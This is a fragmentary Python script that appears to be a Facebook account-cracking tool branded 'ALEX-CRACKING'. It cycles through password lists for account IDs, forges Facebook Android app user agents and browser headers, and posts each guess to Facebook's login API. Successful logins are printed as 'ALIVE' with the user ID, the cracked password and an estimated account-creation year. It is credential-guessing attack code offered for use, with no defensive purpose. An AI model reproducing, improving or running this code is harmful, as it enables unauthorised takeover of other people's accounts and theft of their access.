...
def alex(ids):
    if len(ids)==15:
        ...
        elif ids[:5] in ['10009', '61550', '61551','61552','61553']           :alif = '2023'
        else:alif=''
...
\33[1;32m-------------------------------------------------------- 
  ...
  Network    :  TNT Only (Not Smart sim)
  Version    :  2.5
\33[1;32m--------------------------------------------------------"""
def linex():
        print('\033[93;1m════════════════════════════════════════════════════════')         
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [ALEX-CRACKING]  %s | ALIVE: %s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua  = '[FBAN/FB4A;FBAV/'+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +';FBBV/'+str(random.randint(11111111,77777777))+';[FBAN/FB4A;FBAV/325.0.0.4.166;FBBV/297198630;FBDM/{density=2.4,width=1080,height=1422};FBLC/ro_RO;FBRV/0;FBCR/TNT;FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/M2102J20SG;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'               
                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="118", "Google Chrome";v="118"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
                        ...
                        complete = session.post('https://b-graph.facebook.com/auth/login',data=idpass,allow_redirects=False,headers=head)
...
def rndm(ids,passlist):
        ...
        try:
                for pas in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.3,width=1080,height=1470};FBLC/ro_RO;FBRV/'+fbrv+';FBCR/Nepal Telecom;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 6A;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:;]'                        
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [ALEX-ALIVE] '+str(uid)+' | '+pas+' | ['+alex(ids)+']\033[1;97m')
